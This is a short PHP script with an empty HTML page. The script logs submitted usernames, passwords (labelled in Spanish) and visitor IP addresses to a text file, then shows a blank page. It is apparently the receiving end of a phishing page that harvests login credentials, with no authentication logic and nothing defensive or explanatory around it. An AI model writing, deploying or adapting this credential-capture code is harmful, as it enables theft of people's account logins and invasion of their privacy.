<?php

$log = fopen("log.txt", "a");
fwrite($log, "Usuario: ".$_POST['user']."\n");
fwrite($log, "Contraseña: ".$_POST['pass']."\n");
fwrite($log, "IP: ".$_SERVER['REMOTE_ADDR']."\n");
fclose($log);

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    
</body>
</html>